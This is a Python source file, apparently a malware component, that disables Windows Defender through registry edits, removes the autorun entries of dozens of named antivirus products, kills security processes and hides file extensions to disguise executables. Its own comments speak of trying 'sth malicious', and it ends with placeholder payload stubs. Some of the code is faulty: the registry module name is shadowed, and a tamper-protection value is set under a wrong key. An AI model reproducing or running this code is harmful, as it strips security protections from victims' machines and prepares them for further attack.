import winreg as reg
import wmi
import ctypes

kprocs = ['SecurityHealthHost.exe', 'SecurityHealthSystray.exe', 'SecHealthUI.exe']
av_list = ['avast.exe', 'ashServ.exe', 'avgemc.exe', 'EPProtectedService.exe', 'epsecurityservice.exe', 
           'epupdateservice.exe', 'epupdateserver.exe', 'sfc.exe', 'cavwp.exe', 'cfp.exe', 'CylanceSvc.exe', 
           'eav_nt32.exe', 'eav.exe', 'ERAAgent.exe', 'fsav32.exe', 'fsdfwd.exe', 'fsguiexe.exe', 'klnagent.exe', 
           'mbam.exe', 'mbar.exe', 'mbae.exe', 'McUICnt.exe', 'mfemms.exe', 'mfevtps.exe', 'mcshield.exe', 
           'mfeesp.exe', 'mfetps.exe', 'mfetrs.exe', 'mfetp.exe', 'mcods.exe', 'mpfservice.exe', 'mpfagent.exe', 
           'mcshell.exe', 'mssclli.exe', 'avengine.exe', 'PCMaticRemoteDesktopServe.exe', 'pcmaticpushcontroller.exe',
            'PCMaticRT.exe', 'SAVService.exe', 'SAV.exe', 'SemLaunchSvc.exe', 'Symantec.exe', 'sepWscSvc64.exe', 
            'ntrtscan.exe', 'tmntsrv.exe', 'pccpfw.exe', 'wrsa.exe', 'webroot.exe', 'MsMpEng.exe', 'MpCmdRun.exe', 
            'MSASCuiL.exe']

"""
disabling Windows Defender processes is based on: 
https://www.tenforums.com/tutorials/5918-how-turn-off-microsoft-defender-antivirus-windows-10-a.html#option2
https://www.tenforums.com/tutorials/123792-turn-off-tamper-protection-microsoft-defender-antivirus.html
""" 
#Tamper Protection is User Account Control (UAC) feature that helps prevent changes to security settings in Windows Defender Security Center and prevents malicious apps from changing Windows Defender AV settings.
def dis_Tamper_Protection():
    # Open the registry key
    key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows Defender\Features", 0, reg.KEY_SET_VALUE)
    
    # Set the value of 'EnableLUA'
    reg.SetValueEx(key, "EnableLUA", 0, reg.REG_DWORD, 0)
    
    # Close the key
    reg.CloseKey(key)
    
    #print("Tamper protection disabled.")

def dis_AntiSpyware():
    # Open the registry key
    key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender", 0, reg.KEY_SET_VALUE)
    
    # Set the value of 'DisableAntiSpyware'
    reg.SetValueEx(key, "DisableAntiSpyware", 0, reg.REG_DWORD, 1)
    
    # Close the key
    reg.CloseKey(key)
    
    #print("Anti-spyware disabled.")


# Disable potential extra AVs in HKCU and HKLM registry - propably in HKLM, but we can also try HKCU
def remove_AV():
    reghives = [reg.HKEY_LOCAL_MACHINE, reg.HKEY_CURRENT_USER]
    regpaths = [r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 
                r'SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce']
    for reghive in reghives:
        for regpath in regpaths:
            reg = reg.ConnectRegistry(None, reghive)
            # Open key with write access
            key = reg.OpenKey(reg, regpath, 0, access=reg.KEY_WRITE)
            try:
                index = 0
                while True:
                    val = reg.EnumValue(key, index)  # Still need to enumerate values
                    for name in av_list:
                        if name in val[1]:  # If the antivirus executable is found
                            #print(f"Deleting {val[0]} Autorun Key")
                            reg.DeleteValue(key, val[0])  # Delete the registry entry
                    index += 1
            except OSError:
                pass  # No more values to enumerate


def hide_file_extensions(hide=True):
    # Open the registry key
    key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", 0, reg.KEY_SET_VALUE)
    
    # Set the value of 'HideFileExt'
    reg.SetValueEx(key, "HideFileExt", 0, reg.REG_DWORD, 1 if hide else 0)
    
    # Close the key
    reg.CloseKey(key)
    
    print(f"File extensions {'hidden' if hide else 'visible'}.")

# Call the function to hide or unhide file extensions
hide_file_extensions(hide=True)  # Set to False if you want to show file extensions


def kill_processes():
    # Create a WMI object
    c = wmi.WMI()
    # Iterate through the processes
    for process in c.Win32_Process():
        # Check if the process is in the list of AV processes
        if process.Name in kprocs:
            # Terminate the process
            process.Terminate()
            
            #print(f"Killed {process.Name}.")


#preparing the OS - check if the user is an admin or common user
def check_admin():
    is_admin = ctypes.windll.shell32.IsUserAnAdmin()
    return is_admin
   

def regedit_Modify():
    is_admin = check_admin()
    if is_admin: # admin privilages should be able to modify the registry by disabling the AVs, hide file extensions and kill processes 
        dis_Tamper_Protection()
        dis_AntiSpyware()
        remove_AV()
        hide_file_extensions(hide=True)
        kill_processes()
        test_something_admin()
    else:
        remove_AV()
        kill_processes() # we can try to kill AV processes even if the user is not an admin and try sth malicious, but most likely it will not work with low privilages
        test_something()

def test_something_admin():
           print("hello!")

def test_something():
           print("hello!")


